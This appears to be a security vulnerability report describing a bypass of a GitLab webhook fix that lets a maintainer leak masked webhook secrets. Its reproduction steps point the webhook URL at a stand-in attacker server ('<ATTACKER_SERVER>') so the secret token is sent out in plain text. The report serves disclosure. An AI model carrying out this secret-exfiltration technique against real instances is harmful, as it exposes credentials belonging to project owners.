## Report

#####  Summary

There is a vulnerability https://gitlab.com/gitlab-org/gitlab/-/issues/385118 that was fixed and disclosed recently.  The fix adds an extra check in case the URL changes:

```ruby  
###  https://gitlab.com/gitlab-org/gitlab/-/commit/7f34991ae36f1804610ba9980e31191394c8b208

###  ...

  before_validation :reset_url_variables, unless: ->(hook) { hook.is_a?(ServiceHook) }  
 
###  ...

  def reset_url_variables  
    self.url_variables = {} if url_changed? && !encrypted_url_variables_changed?  
  end

```

However, `reset_url_variables` will return `false` if the URL variables have also been changed. This allows bypassing the check by adding a new variable to the modified URL.

#####  Steps to reproduce

As a project owner

1. Create a project  
1. Add another user to the project as a maintainer  
1. Go to Settings > Webhooks  
1. Put the URL `https://example.com?token=secret-token`  
1. Click to add a mask  
1. Add the value `secret-token` with the replacement `TOKEN`  
1. Click save for the webhook

As a maintaner

1. Open the project  
1. Go to Settings > Webhooks  
1. Click edit on the webhook  
1. Edit the URL to your controlled server like that: `https://<ATTACKER_SERVER>?token={TOKEN}&a=aaaaa`  
1. Add the value `aaaaa` with the replacement `A`  
1. Save the webhook  
1. Now click `Test` to send a request  
1. Check your server logs; it will contain the secret in plain text

#####  Impact

This vulnerability allows an attacker with the Maintainer role to leak webhook secrets.

#####  What is the current *bug* behavior?

Adding or deleting a new secret does not reset the previously saved ones

#####  What is the expected *correct* behavior?

Adding or deleting a new secret resets the previously saved ones
